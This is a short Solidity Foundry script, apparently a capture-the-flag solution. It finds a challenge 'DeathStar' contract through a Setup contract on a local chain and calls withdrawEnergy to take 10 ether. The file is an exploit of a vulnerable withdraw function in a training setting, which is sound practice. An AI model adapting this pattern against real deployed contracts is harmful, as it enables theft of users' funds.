// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

interface IDeathStar{
    function withdrawEnergy(uint256 amount) external; 
}

interface ISetup{
    function deathStar() external view returns(IDeathStar);
}

contract Solve is Script{
    function run()public{
        address _setup=0x5FbDB2315678afecb367f032d93F642f64180aa3/* YOUR+_SETUP_ADDRESS*/;
        vm.startBroadcast();
        ISetup setup=ISetup(_setup);
        IDeathStar deathStar=setup.deathStar();
        deathStar.withdrawEnergy(10 ether);
        vm.stopBroadcast();
    }
}